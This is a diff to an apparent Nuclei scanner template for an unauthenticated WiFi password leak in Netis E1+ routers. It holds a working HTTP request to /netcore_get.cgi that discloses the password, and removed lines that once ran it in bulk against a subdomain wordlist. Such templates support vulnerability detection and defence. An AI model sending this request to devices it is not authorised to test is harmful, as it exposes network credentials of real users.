@@ -4,22 +4,18 @@ info:
   name: Netis E1+ V1.2.32533 - Unauthenticated WiFi Password Leak
   author: gy741
   severity: medium
-  reference: https://www.exploit-db.com/exploits/48384
-  tags: netis,exposure
+  description: A vulnerability in Netis allows remote unauthenticated users to disclose the WiFi password of the remote device.
+  reference:
+    - https://www.exploit-db.com/exploits/48384
+  tags: netis,exposure,edb
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
+  - raw:
       - |
-        GET /netcore_get.cgi HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
+        GET //netcore_get.cgi HTTP/1.1
+        Host: {{Hostname}}
         Cookie: homeFirstShow=yes
+
     matchers-condition: and
     matchers:
       - type: status
